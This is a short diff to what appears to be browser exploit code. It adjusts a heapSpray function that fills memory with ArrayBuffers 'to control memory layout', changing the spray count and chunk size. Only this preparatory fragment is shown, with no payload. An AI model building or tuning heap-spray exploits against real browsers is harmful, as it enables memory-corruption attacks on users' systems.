@@ -20,8 +20,8 @@
     // Heap spray to control memory layout
     function heapSpray() {
       window.spray = [];
-      for (let i = 0; i < 1000; i++) {
-        window.spray.push(new ArrayBuffer(0x1000)); // Smaller chunks for finer control
+      for (let i = 0; i < 500; i++) {
+        window.spray.push(new ArrayBuffer(0x500)); // Smaller chunks for finer control
       }
     }
 
